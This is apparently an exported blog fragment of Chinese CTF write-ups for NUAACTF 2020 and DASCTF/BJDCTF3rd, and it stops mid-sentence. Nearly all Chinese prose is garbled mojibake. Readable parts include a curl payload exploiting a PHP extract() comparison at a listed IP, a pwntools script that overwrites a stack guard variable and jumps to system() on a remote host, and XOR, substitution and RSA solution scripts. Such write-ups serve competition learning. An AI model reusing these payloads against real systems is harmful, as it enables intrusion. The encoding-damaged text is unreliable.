106.14.153.173 8443 ä¹‹ååŠ çš„ Hint: HTTPå‘å±•å² è¿™é¢˜çœ‹åˆ°æœ€æ–°çš„ HTTPï¼Œå…¶å®æˆ‘ä¸€å¼€å§‹å°±çŒœæ˜¯ HTTP3ï¼ˆQUICï¼‰äº†ã€‚ï¼ˆæœç„¶æ˜¯é™†è€æ¿å‡ºçš„é¢˜ï¼Œå˜¤å˜¤å˜¤ æ¯•ç«Ÿæˆ‘è¿™ä¸ªåšå®¢æœ¬èº«å°±åŸºäº CloudFlare éƒ¨ç½²äº† HTTP3ï¼Œåªæ˜¯ç›®å‰çš„æµè§ˆå™¨æ”¯æŒè¿˜ä¸æ˜¯å¾ˆå¥½ã€‚ è¿™é¢˜è¯•ç€ç”¨ Chrome å¼€å¯ QUIC è¿›è¡Œè®¿é—® https://106.14.154.173:8443 ï¼Œå‘ç°è¢«æ‹’ç»ã€‚ç”¨wireshark æŠ“åŒ…ä¹Ÿæ²¡æŠ“åˆ°æœ‰å…³çš„æµé‡ï¼Œåªçœ‹åˆ°äº† TCP æ•°æ®åŒ…ã€‚ ä¸­é€”æ€€ç–‘éš¾é“æ˜¯ HTTP2 çš„ä¸€äº›ç½•è§æ–¹æ³•ï¼Ÿäºæ˜¯ç”¨ postman æŠŠæ‰€æœ‰æ–¹æ³•éƒ½è¯•äº†ä¸€éï¼Œå…¨è¢«æ‹’ç»äº†ã€‚ å†å›æ¥é‡æ–°æœäº†ä¸€æ³¢ HTTP3 çš„èµ„æ–™ï¼Œè€ƒè™‘æ˜¯ç”¨ curl æ¥è¿æ¥ï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹ï¼Œæ¯”å¦‚ä¸‹é¢å‡ ä¸ªï¼š HTTP/3ï¼šè¿‡å»ï¼Œç°åœ¨ï¼Œè¿˜æœ‰æœªæ¥ ï¼ˆè¿™ä¹Ÿæ˜¯æœ€åç»™çš„hintäº†ï¼‰ curl HTTP3 (and QUIC) curl çš„ç”¨æ³•æŒ‡å—ï¼ˆé˜®ä¸€å³°ï¼‰ libcurl programming tutorial How to Test if a Website supports HTTP/3? How to Build and Install latest cURL version on CentOS/RHEL? ç½‘ç«™ HTTP3 éƒ¨ç½²æµ‹è¯•ï¼š HTTP/3 Test, Check if H3/QUIC is enabled on your website HTTP/3 CHECK ç„¶åæŒ‰ç…§ä¸Šé¢çš„æµç¨‹åŸºäº Rust &amp; quiche æ¥å®‰è£… curlã€‚ Build quiche and BoringSSL: git clone --recursive https://github.com/cloudflare/quiche cd quiche cargo build --release --features pkg-config-meta,qlog mkdir deps/boringssl/lib ln -vnf $(find target/release -name libcrypto.a -o -name libssl.a) deps/boringssl/lib/ è€Œå Build curl: cd .. git clone https://github.com/curl/curl cd curl ./buildconf ./configure LDFLAGS=\"-Wl,-rpath,$PWD/../quiche/target/release\" --with-ssl=$PWD/../quiche/deps/boringssl --with-quiche=$PWD/../quiche/target/release --enable-alt-svc make ä¸Šé¢ build è¿‡ç¨‹ä¸­éœ€è¦è‡ªè¡Œå®‰è£… cargoã€CMakeã€Goã€autoconfã€libtoolize ç­‰ä¾èµ–ï¼Œæˆ–è€…æ ¹æ®æŠ¥é”™ä¿¡æ¯ç›¸åº”è¿›è¡Œå®‰è£…å°±å¥½ã€‚ï¼ˆä¸€ç¯å¥—ä¸€ç¯ï¼Œç»äº† æ¯”å¦‚ CMake æŠ¥é”™æ‰¾ä¸åˆ° Goï¼š sudo apt install golang å†æ¯”å¦‚æŠ¥é”™éœ€è¦ autoconfã€libtoolizeï¼š sudo apt install autoconf sudo apt install libtoolize ç„¶è€Œå›½å†…å‡ºå£é€Ÿåº¦ä¸è¡Œï¼Œåœ¨æœ¬åœ°åœ¨å›½å†…çš„æœåŠ¡å™¨ä¸Šéƒ½è¯•äº†ï¼Œè£…äº†å‡ ä¸ªå°æ—¶ curl åˆ°æ¯”èµ›ç»“æŸéƒ½æ²¡è£…ä¸Šï¼Œä»£ç åŠå¤©æ‹‰ä¸ä¸‹æ¥ã€‚åæ¥ç›´æ¥ä¸‹è½½ä»“åº“ ZIP å†è£…ï¼Œbuild è¿˜è¦ä¸‹è½½æ–°ä¸œè¥¿ï¼Ÿï¼Ÿï¼Ÿå¥½æ°”å•Šï¼åšé¢˜çš„æ—¶å€™è¶…æƒ³æ‰¾ä¸ª curl ç¼–è¯‘æœ‰ http3 çš„å°ä¼™ä¼´ã€‚ã€‚ï¼ˆçœ‹æ¥æ‰“CTFæ•´ä¸ªå›½å¤–VPSæ¥è·‘å¾ˆæœ‰å¿…è¦ å®‰è£…å¥½ä¹‹åå°±å¯ä»¥è¯•è¯•äº†ï¼Œæ¯”å¦‚çœ‹çœ‹ç‰ˆæœ¬ä¿¡æ¯ã€‚ï¼ˆè¦ç”¨ build å¥½çš„ curlï¼‰ ./curl --version è¿™é¢˜ curl å‡ºæ¥æ˜¯ä¸€ä¸ªwebé¢˜â€¦â€¦ ./curl -v https://106.14.153.173:8443 --http3 æç¤ºè®¿é—®check.php. ./curl -v https://106.14.153.173:8443/check.php --http3 å¾—åˆ°ä¸€é“é¢˜ï¼ŒPHPçš„ã€‚ &lt;code&gt;&lt;span style=\"color: #000000\"&gt; &lt;span style=\"color: #0000BB\"&gt;&amp;lt;?php&lt;br /&gt;&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;include&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #DD0000\"&gt;'flag.php'&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;;&lt;br /&gt;&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;error_reporting&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;(&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;0&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;);&lt;br /&gt;if&amp;nbsp;(&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;$_SERVER&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;[&lt;/span&gt;&lt;span style=\"color: #DD0000\"&gt;\"REQUEST_METHOD\"&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;]&amp;nbsp;==&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #DD0000\"&gt;\"POST\"&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;)&amp;nbsp;{&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;extract&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;(&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;$_POST&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;);&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if&amp;nbsp;(&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;$pass&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;==&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;$newpass&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;)&amp;nbsp;{&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;echo&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;$flag&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;}&lt;br /&gt;&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;highlight_file&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;(&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;__FILE__&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;);&lt;br /&gt;&lt;/span&gt; &lt;/span&gt; &lt;/code&gt; ä¼ å…¥ä¸¤ä¸ªå‚æ•°passå’Œnewpassï¼Œè®©å®ƒä¿©çš„å€¼ç›¸ç­‰å°±è¡Œäº†ã€‚ ./curl -v https://106.14.153.173:8443/check.php --http3 -d \"pass=1&amp;newpass=1\" ç„¶åå¾—åˆ°flagï¼š NUAACTF{WH4T_d0_y0u_kn0w_H334} å¦ä¸€ç§ curl æ–¹æ³•æƒ³åˆ°ä¸€ä¸ªæ–¹æ¡ˆï¼Œå°±æ˜¯ç›´æ¥æ‹‰åˆ«äººæ„å»ºå¥½çš„ docker é•œåƒã€‚ æ‰¾åˆ°äº†ä¸€ä¸ª build æœ‰ HTTP3 çš„ curl docker imageï¼šymuski/curl-http3 Docker image of curl compiled with BoringSSL and quiche/0.2.0 for HTTP3 support, httpstat for visualization. GitHub ä»“åº“ï¼š**curl-http3** # docker run -it --rm ymuski/curl-http3 curl -V curl 7.71.0-DEV (x86_64-pc-linux-gnu) libcurl/7.71.0-DEV BoringSSL quiche/0.4.0 Release-Date: [unreleased] Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp Features: alt-svc AsynchDNS HTTP3 HTTPS-proxy IPv6 Largefile NTLM NTLM_WB SSL UnixSockets è€Œåç›´æ¥åšé¢˜å°±å®Œäº‹äº†ã€‚ docker run -it --rm ymuski/curl-http3 curl -Lv https://106.14.153.173:8443/check.php --http3 -d \"pass=a&amp;newpass=a\" Revrev1-xorpyc åç¼–è¯‘ï¼ˆå¯ä»¥åˆ©ç”¨è¿™ä¸ªå·¥å…·ï¼‰ from flag import flag s = 'qwertyuiopasdfghjklzxcvbnm1234567890' for x in range(0, len(flag)): print(ord(s[x]) ^ ord(flag[x]), ' ', **None) å“‡å‘œï¼Œæœ€ç®€å•çš„å¼‚æˆ–ï¼Œç›´æ¥å¼‚æˆ–å›å»å°±å®Œäº‹äº†ã€‚ Exp: encrypted = \"31 2 4 19 23 13 19 18 24 31 22 44 29 9 18 55 9 10 2 37 10 6 23 14 2 20 110 86 82 90 86 83 74\" s = 'qwertyuiopasdfghjklzxcvbnm1234567890' m = encrypted.split(' ') m=list(map(int,m)) print(m) for x in range(0, len(m)): print(chr(ord(s[x]) ^ m[x]), end=\"\") nuaactf{wow_you_can_really_dance} rev2-demium encryptæ˜¯flagç”¨mediumåŠ å¯†æ¥çš„ï¼Œå°è¯•é€†å‘å®ƒå§ çœ‹äº†çœ‹é€†å‘ï¼Œå¥½åƒæœ‰ç‚¹å¤æ‚ã€‚ è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°flagå’Œencrypt.txtä¸­çš„å¤´4ä¸ªå­—æ¯å¯¹åº”çš„ã€‚äºæ˜¯ç›´æ¥å€Ÿç”¨è¿™ä¸ªç¨‹åºå»ºç«‹ä¸€ä¸ªå¯†ç æ˜ å°„å…³ç³»å°±å®Œäº‹äº†ã€‚ python å†™ä¸€æ³¢jioæœ¬ã€‚ Expï¼š # -*- coding:utf-8 -*- m = r\"W1og39p2Kp+2_Zpx2{/yF\" s = r\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!@#$%^&amp;*()_+\" e = r\"oLlQfWgThE_1-ZpsUHMS+ex6K\\tP{9I}Jn8C4/kmcd5yBAz0RDaVrwuGvNjqOYi===========2b\" flag = '' for i in m: index = e.find(i) # print(e.find(i)) if index &gt;= 0: single = s[index] # print(single) flag += single print(flag) # flagDo_you_know_CLR ï¼ˆexpä¸­æ²¡æœ‰å†™{ }çš„å¯¹åº”å…³ç³»ï¼Œé—®é¢˜ä¸å¤§ å¾—åˆ° flag: flag{Do_you_know_CLR} CryptoCrypto1-è´æ–¯base64 ä¸€æ³¢å®Œäº‹ crypto4-RREAL_RSAå“‡å‘œï¼Œæœ‰ç›´æ¥äº†å½“çš„ RSAï¼ Public key: e=65537, n=1106081963347301781444155926534938643298217639670251381867474826890728970307 Encrypted flag: c=681873475888907291485502809441689140305197371659486141705279050132490452420 å¤§æ•´æ•°Nåˆ†è§£å¾—åˆ°ä¸¤ä¸ªè´¨æ•°ï¼š 6598638704725743849027686163703739789 167622749606696848477732277529837832463 æœ¬åœ°è·‘äº†åŠå¤©æ²¡è·‘å‡ºæ¥ï¼Œæ‹¿å» http://factordb.com/ è¿™é‡Œåˆ†è§£å°±å¥½äº†ã€‚ è®¡ç®—Då†è§£å¯†Cå³å¯å¾—åˆ°flag flag{Here_Is_R4a1_Rs@} PWNpwn1æŒ‰åˆ˜å¸ˆå‚…æ„æ€ï¼Œæœç„¶æœ‰ç­¾åˆ°é¢˜ã€‚ ç›´æ¥ncå°±å‡ºæ¥äº† pwn3æ”¹v2ç»•è¿‡ cannary æŠŠv2æ”¹æˆ 0x40 Exp: from pwn import * context.log_level = 'debug' c = remote('49.235.243.206', 10503) #c = process('./33') #gdb.attach(c) sysaddr = 0x004007FB payload = '' payload +=p64(sysaddr) c.send('a'*0x20) sleep(1) c.send(p64(0x40)) sleep(1) c.sendline(payload) c.interactive() å°ç»“å…¶å®ç°åœ¨æ„Ÿè§‰åšå‡ºæ¥çš„é¢˜ç›®è¿˜ç®—å¾ˆå¸¸è§„çš„ï¼Œå¤§éƒ½æ˜¯å¸¸ç”¨çš„å¥—è·¯ç½¢äº†ã€‚ æ¯•ç«Ÿæ˜¯æ ¡èµ›ï¼Œæœ¬èº«æ ¡å†…ç©è¿™ä¸ªçš„ä¹Ÿä¸å¤šï¼Œé¢˜ç›®çš„è¯è‡ªç„¶ç›¸å¯¹äºå¤–é¢è€Œè¨€å‹å¥½å¤šäº†ã€‚ ä¸è¿‡è¯è¯´å›æ¥ï¼Œè¿™æ¬¡æ¯”èµ›éš¾åº¦ç¨å¤§çš„é¢˜ç›®è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œç”šè‡³ç½‘ä¸Šè¿˜æ²¡æœ‰è¿‡ç›¸å…³çš„æ€è·¯ï¼Œå‡ºé¢˜å¸ˆå‚…ä»¬ä¹ŸæŒºè´¹å¿ƒè¡€äº†ã€‚ æœ‰çš„é¢˜ç›®æœ‰äº†æ€è·¯ï¼Œç°åœºæŸ¥äº†åŠå¤©èµ„æ–™è¿˜åšä¸å‡º flag æ¥ï¼Œè¿™æ—¶å€™å°±æŒºç»æœ›çš„ã€‚ ï¼ˆè¿˜æœ‰æ¯”å¦‚ä¸ºäº†ä¸€ä¸ªé¢˜ç”¨ http3 è£…äº†å‡ ä¸ªå°æ—¶ curl åˆ°æ¯”èµ›ç»“æŸéƒ½æ²¡è£…ä¸Šï¼Œä»£ç åŠå¤©æ‹‰ä¸ä¸‹æ¥æ°”æ­»æˆ‘äº† è¿˜è¦æ„Ÿè°¢é˜Ÿå‹ä¸€èµ·å†²å‘€ï¼ä¹Ÿç®—æ˜¯ä¸€ä¸ªå°å¿ƒæ„¿å®ç°äº†å§å˜»å˜»å˜»ã€‚ å¯èƒ½è¿™å°±æ˜¯ CTF çš„é­…åŠ›å§ã€‚ å°±å…ˆè¿™æ ·äº†8ï¼Œåé¢æœ‰ç©ºå†æ¥å¤ç°å–µ~ ï¼ˆæºœäº†å–µ","path":"2020/05/30/CTF_2020NUAACTF/"},{"title":"CTF | DASCTF May & BJDCTF3rd éƒ¨åˆ†WriteUp","text":"å¼•è¨€ å“‡å‘œï¼Œè½¬çœ¼é—´ä¸€ä¸ªæœˆåˆè¿‡å»äº†ã€‚è¿™ä¸ªæœˆäº‹æƒ…æŒºå¤šçš„ï¼Œå½“ç„¶ä¹Ÿæ¯”è¾ƒæ‡’ï¼Œä¸€ç›´å’•ç€æ²¡æ¥æ›´æ–°åšå®¢ã€‚ å‰ä¸¤å¤©æ°´äº†ä¸€ä¸‹ DASCTF äº”æœˆèµ› &amp; BJDCTF3rdï¼Œè¿™æ¬¡ä¸æ˜¯æ–°ç”Ÿèµ›äº†ï¼Œè¿˜æ˜¯å’Œä¼ä¸šåˆåŠçš„ï¼Œäºæ˜¯éš¾åº¦å¤§çš„äºšæ‰¹ï¼Œæ‰“å¾—éƒ½è‡ªé—­äº†ã€‚ï¼ˆæ²¡ç†ç”±å¹æ–°ç”Ÿèµ›äº†å˜¤å˜¤å˜¤ã€‚ æœ‰ä¸€ç§å¥½ä¹…æ²¡æ‰“ CTF çš„æ„Ÿè§‰ï¼Œè¿™æ¬¡ä¸Šæ‰‹æŒºç”Ÿç–çš„ï¼ˆï¼Ÿ é¢˜ç›®çœ‹ä¸Šå»æŒºå¤šçš„ï¼Œç¡®å®ä¹Ÿæ˜¯ï¼Œç„¶è€Œå°±ä¸æ€ä¹ˆä¼šåšå˜›ã€‚ï¼ˆæ‘Šæ‰‹ å®˜æ–¹é—®é¢˜æ±‡æ€»æ–‡æ¡£è§è¿™é‡Œã€‚ï¼ˆåŒ…æ‹¬ hint ç­‰ï¼‰ è¿™æ¬¡ä¸»è¦æ¥çœ‹çœ‹ Misc é¢˜å§ï¼Œå…¶ä»–çš„éšæ„çœ‹çœ‹å¥½äº†ã€‚ï¼ˆåæ­£ä¹Ÿä¸ä¼šåš æ¯”èµ›ç»“æŸåé¢˜ç›®ç¯å¢ƒå·²ç»å…³äº†ï¼Œéšä¾¿å†™å†™8. Reverseblink ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶~(è¯·å°†flagç»è¿‡md5åæäº¤) hint1: å®Œæ•´çš„å›¾æ¡ˆå¯ä»¥æ‰«ä¸€æ‰« hint2: http://taqini.space/2020/04/30/shell-output-control-code hint3: æ­¤é¢˜æœ‰å¤šç§è§£æ³•ï¼Œä¸ä¸€å®šè¦ç¡¬æŠŠflagé€†å‡ºæ¥ è¿™é¢˜æœ¬æ¥æ˜¯æƒ³é€†å‘è§£çš„ï¼Œå°±æ˜¯ä»–ç”¨äº†ä¸å°‘è¾“å‡ºæ§åˆ¶ç ï¼Œçœ‹äº†ä¸€ä¸‹æŒºå¤æ‚çš„ã€‚ å¯ä»¥æ‰«ä¸€æ‰«ï¼Œæ˜ç¡®å°±æ˜¯äºŒç»´ç ä¹‹ç±»çš„äº†ã€‚ ä¸€é—ªä¸€é—ªçš„ï¼Œçªç„¶æƒ³åˆ°æˆªå›¾ç„¶åå åŠ å°±å¥½äº†å‘€ï¼ æ–­å¼€è¿æ¥åå†ä¸€çœ‹ï¼Œä»–çš„å®ç°æ˜¯ä¸€å±ä¸€å±åˆ·çš„ï¼Œæ¯ä¸€æ¬¡è®°å½•éƒ½ä¿ç•™åœ¨ç»ˆç«¯é‡Œï¼Œç›´æ¥ç»ˆç«¯é‡Œå¤åˆ¶ç»“æœï¼Œå†å†™ä¸ª jio æœ¬å°±å¥½äº†å‘€ï¼ Expï¼š pythonå¤§æ³•å¥½å‘€ï¼ æˆ‘è¿™é‡Œåˆ†åˆ«å¤åˆ¶äº†10æ¬¡é—ªçƒçš„ç»“æœåˆ°æ–‡ä»¶é‡Œï¼Œè€ƒè™‘10æ¬¡åº”è¯¥å¤Ÿäº†ã€‚ å›¾å½¢æ˜¯25*25çš„ï¼Œç”¨ä¸€ä¸ªçŸ©é˜µæ¥å­˜æ˜¯0è¿˜æ˜¯1. ä¹‹åå†è½¬æ¢åˆ° [0, 255] uint8 ç±»å‹ï¼Œç”¨ PIL ä½œå›¾å¥½äº†ã€‚ # -*- coding:utf-8 -*- from PIL import Image import numpy as np table = np.zeros((25, 25), dtype=int) # print(table) for i in range(1, 11): with open('{}.txt'.format(i), 'r', encoding='utf-8') as fin: row = 0 while row &lt; 25: line = fin.readline() print(line) for j in range(0, 49, 2): if line[j] == 'x': table[row][j//2] = 1 row += 1 a = [[0 if b == 0 else 255 for b in row] for row in table] qrcode = Image.fromarray(np.uint8(np.array(a))) qrcode.show() qrcode.save('qrcode.png') è¿™é‡Œå›¾ç‰‡åè‰²äº†è¿˜æœ‰ç‚¹å°å•Šå“ˆå“ˆå“ˆã€‚é—®é¢˜ä¸å¤§ï¼Œæ”¾å¤§æ¥æ‰«å°±æ˜¯äº†ã€‚ æ‰«ç å¾—åˆ° BJD{TW1NKLE_TW1NKLE_L1TTLE_5TAR} çœŸæ˜¯ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶~ MD5 åå¾—åˆ° e1eded5a7f630a2d02d3fe17b786919a å“‡å¥½è€¶ï¼Œè¿™é¢˜å¥½éš¾å¾—å•Šï¼Œæ˜¯ 17 ä¸ªåšå‡ºæ¥çš„ä¹‹ä¸€å”‰ã€‚ MiscQuestionnaire å®~ æ‚¨æœ‰ä¸€ä»½è°ƒæŸ¥é—®å·~ è¯·æŸ¥æ”¶~ https://forms.gle/Vmzt99LazrtXsRLM9 flagæ ¼å¼ï¼š32ä½å­—ç¬¦ä¸² å…³äºé—®å·é—®é¢˜ç­”æ¡ˆï¼šè¯·ä½¿ç”¨è‹±æ–‡æˆ–æ‹¼éŸ³ä½œç­”ã€‚ é—®å·ç¬¬ä¸ƒé¢˜hint ç¦»ä¸­å›½ç§‘å­¦é™¢å¤§å­¦æœ€è¿‘çš„é•¿åŸ ç­”æ¡ˆä¸ºé•¿åŸåå­—çš„æ‹¼éŸ³ï¼Œä¾‹å¦‚: Badaling ç­”å¯¹æ¯é¢˜éƒ½ä¼šæç¤ºflagçš„ä¸€éƒ¨åˆ† Flagä¸€å…±7éƒ¨åˆ† é™¤äº†å¤§å­¦å’Œå…¬å›­å¤– å…¶ä½™é¢˜ç›®éƒ½æ˜¯æ‹¼éŸ³ è¿™æ˜¯ä»€ä¹ˆç­¾åˆ°é¢˜ï¼Ÿï¼Ÿï¼Ÿ æœ€å¼€å§‹ä»¥ä¸ºæ˜¯å¡«äº†ä¹‹åæ”¾flagçš„ï¼Œå‘ç°å¹¶ä¸æ˜¯ã€‚ å¡«äº†å‡ ä¸ªå‘ç°é”™è¯¯æç¤ºï¼Œå’Œ TaQini å¸ˆå‚… py äº†ä¸€ä¸‹ï¼Œæœç„¶æ˜¯ä¸€ä¸ªé¢˜ç»™ä¸€éƒ¨åˆ† flagï¼Œæœ€åè¿èµ·æ¥ã€‚ï¼ˆä¸è¿‡åˆ°æœ€åä¹Ÿæ”¾ hint äº†å“ˆå“ˆå“ˆ å€ŸåŠ©ç™¾åº¦è¯†å›¾ã€æœç‹—è¯†å›¾ã€è°·æ­Œè¯†å›¾ï¼Œå¥½ä¸å®¹æ˜“æ‰æ•´æ˜ç™½æ˜¯å•¥ã€‚ã€‚ï¼ˆæ„Ÿè§‰æ‰¾ä¸ªè€åŒ—äº¬äººè¦å¿«å¾—å¤šå‘¢2333 å›¾ç‰‡åˆ†åˆ«å¯¹åº”ç€ï¼š BIT åŒ—ç†å·¥ d41d å¥½é‚»å±… 8cd9 ç¨»é¦™æ‘ 8f00b2 jingweizhai 04e9 Jingshan Park æ™¯å±±å…¬å›­ 8009 chaoyang æœé˜³ 98ecf8 hefangkou æ²³é˜²å£ 427e ï¼ˆæœ€åè¿™ä¸ªé•¿åŸæŸ¥äº†åŠå¤©ï¼Œæœç´¢å¼•æ“å‘Šè¯‰æˆ‘æ€€æŸ”åŒºçš„é•¿åŸæ˜¯æ…•ç”°å³ªï¼ˆç¡®å®ï¼‰ã€‚ã€‚åæ¥å’Œ TaQini å¸ˆå‚…èŠåˆ°è¯´è¿™æ˜¯ä¸ªé²œä¸ºäººçŸ¥çš„é•¿åŸâ€¦â€¦ è¿èµ·æ¥å¾—åˆ° flagï¼š d41d8cd98f00b204e9800998ecf8427e P.S.: åé¢æŸ¥ä¸å‡ºæ¥åœ¨ç½‘é¡µé‡Œä¸€æœï¼Œå‘ç°è¿˜æ˜¯è°·æ­Œçš„å¥—è·¯ï¼Œæ˜¯ç”¨ JavaScript ä¼ å…¥çš„æ•°æ®ã€‚é‡Œé¢å°±æœ‰åŒ¹é…çš„é€»è¾‘äº†ã€‚ ï¼ˆè¿˜æ˜¯ F12 å¤§æ³•å¥½å‘€ï¼ var FB_PUBLIC_LOAD_DATA_ = [null,[\"Let's see how well you know our Capital.\",[[1790362738,\"What is the name of this university?\",null,0,[[336510603,null,0,null,[[4,302,[\"Beijing Institute of Technology|BIT\"] ,\"d41d\"] ] ] ] ,null,null,null,null,[[\"1vV5T8FOS13NOQDji-xYIynLwsUMXcV8aatxUWP6ljvfz-w\",null,[740,416,0] ] ] ] ,[603160739,\"What is the name of the store?\",null,0,[[539054317,null,0,null,[[4,302,[\"Haolinju|haolinju\"] ,\"8cd9\"] ] ] ] ,null,null,null,null,[[\"1x4dT2M6J3EbaiVZ37ssMVunsnsB2UMCM6g4LCHyhlHJu-Q\",null,[740,416,0] ] ] ] ,[488094967,\" What BRAND is this food?\",null,0,[[1465781074,null,0,null,[[4,302,[\"Daoxiangcun|daoxiangcun\"] ,\"8f00b2\"] ] ] ] ,null,null,null,null,[[\"1lH3bwgs28QoVKcUYhtzoqAcacmh4n4CHyWjGQen4RiE3Jw\",null,[375,458,1] ] ] ] ,[1097246628,\"Which RESTAURANT are the ducks coming from? \",null,0,[[353762320,null,0,null,[[4,302,[\"Jingweizhai|jingweizhai\"] ,\"04e9\"] ] ] ] ,null,null,null,null,[[\"11ym4QgB0WEymoJXlmFy7FTC5Eyd5rV1adBbw6vWN5PmXvw\",null,[740,555,0] ] ] ] ,[1916058196,\"Which PARK is this?\",null,0,[[901636349,null,0,null,[[4,302,[\"Jingshan|jingshan\"] ,\"8009\"] ] ] ] ,null,null,null,null,[[\"16pfH3k5-5kDo-Rb9BxeKRvx0S-Qy4IgUdlX8iJ0AUOBIwQ\",null,[740,554,0] ] ] ] ,[1044111735,\"Which DISTRICT is the No.3 of Beijing?\",\"The restaurant in question4 is in this Distric\",0,[[1620980704,null,0,null,[[4,302,[\"Chaoyang|chaoyang\"] ,\"98ecf8\"] ] ] ] ,null,null,null,null,[[\"1VbfGqSSHlM9D_HY1TsENa6rle3axBYbtKdyHS_klYDLG5g\",null,[740,371,0] ] ] ] ,[1877231084,\"Which part of the Great Wall is this?\",\"In Huairou Distric\",0,[[1337434564,null,0,null,[[4,302,[\"Hefangkou|hefangkou\"] ,\"427e\"] //... /bin/cat 2 [CAUTION] cats as numerous as stars are comingâ€¦ è§£å‡ºçš„ç­”æ¡ˆç»md5åæäº¤~ æœ‰ä¸¤ç§å–µå–µï¼Œè¿˜æ˜¯åŠ¨å›¾å”‰ï¼Œè¿œç€çœ‹å°±æ˜¯äºŒç»´ç å˜›ï¼ï¼ˆæœç„¶æ˜¯ TaQini å¸ˆå‚…å‡ºçš„é¢˜ é¦–å…ˆæŠŠå®½åº¦å‹ç¼©åˆ°åŸæ¥ä¸€åŠï¼Œæœ¬æ¥æƒ³ python å†™ä¸ªjioæœ¬çš„ï¼ŒPIL æ„Ÿè§‰æœ‰ç‚¹éº»çƒ¦è¿˜ä¸å¤§ä¼šã€‚ äºæ˜¯ä¸€æ³¢éªšæ“ä½œé‡æ–°ä¸Šä¸ªè‰²å¥½äº†ã€‚ï¼ˆä½ è‚¯å®šæƒ³ä¸åˆ°æˆ‘æ˜¯åœ¨ word ä¸­å¤„ç†çš„å§ï¼Œå˜¿å˜¿å˜¿ PS ä¹Ÿè¡Œï¼ŒStegsolve é‡Œ gif æˆªå–ä¸€å¸§ç„¶åä¸¢å»å–æŸé€šé“æŸ bit ä¿¡æ¯/éšæœºä¸Šè‰²/etc. éƒ½è¡Œã€‚ æ‰«ç å¾—åˆ° m1ao~miao~mi@o~Mia0~m!aO~m1a0~~~ å–µå–µå–µå–µå–µå–µ~ md5åŠ å¯†å¾—åˆ°32ä½flagã€‚ 9b84eb9e7107ffafebeb1000e8c05322 ï¼ˆçœ‹åˆ°è¿˜çœŸæœ‰æ‰‹æ“äºŒç»´ç çš„ tql test your nc 183.129.189.60:10118,10119,10120,10121,10122,10123 hint1: /f1a9.bak ä½ çœ‹åˆ°äº†å˜›? hint2: ç”¨dfå‘½ä»¤çœ‹çœ‹ç¡¬ç›˜æ€»å…±å¤šå¤§ï¼Œå†çœ‹çœ‹flagå¤šå¤§ã€‚ hint3: ç³»ç»Ÿå‘½ä»¤ä¸å¤Ÿä½¿ï¼Ÿè¯•è¯•ä¸‡èƒ½çš„python å…ˆæ¥çœ‹çœ‹ /f1a9.bakã€‚ $ cat /f1a9.bak #!/usr/bin/python #coding=utf-8 from random import randint from uuid import uuid4 flag = [hex(i)[2:-1] for i in uuid4().fields] f=open('/home/ctf/flag','w') f.write('ğŸ€') f.seek(1024*1024*1024) f.write('flag{') offset = 1024 for i in flag: f.seek(1024*1024*1024*randint(offset,offset+2048)) offset += 2048 f.write(i) f.write('}') f.seek(1024*1024*1024*randint(offset,offset+2048)) f.write('good job!') f.close() è¿™é‡Œçš„uuidæ­£å¥½å°±æŸ¥äº†ä¸€ä¸‹ã€‚ UUID: é€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦ ( Universally Unique Identifier ), å¯¹äºæ‰€æœ‰çš„UUIDå®ƒå¯ä»¥ä¿è¯åœ¨ç©ºé—´å’Œæ—¶é—´ä¸Šçš„å”¯ä¸€æ€§. å®ƒæ˜¯é€šè¿‡MACåœ°å€, æ—¶é—´æˆ³, å‘½åç©ºé—´, éšæœºæ•°, ä¼ªéšæœºæ•°æ¥ä¿è¯ç”ŸæˆIDçš„å”¯ä¸€æ€§, æœ‰ç€å›ºå®šçš„å¤§å°( 128 bit ). å®ƒçš„å”¯ä¸€æ€§å’Œä¸€è‡´æ€§ç‰¹ç‚¹ä½¿å¾—å¯ä»¥æ— éœ€æ³¨å†Œè¿‡ç¨‹å°±èƒ½å¤Ÿäº§ç”Ÿä¸€ä¸ªæ–°çš„UUID. UUIDå¯ä»¥è¢«ç”¨ä½œå¤šç§ç”¨é€”, æ—¢å¯ä»¥ç”¨æ¥çŸ­æ—¶é—´å†…æ ‡è®°ä¸€ä¸ªå¯¹è±¡, ä¹Ÿå¯ä»¥å¯é 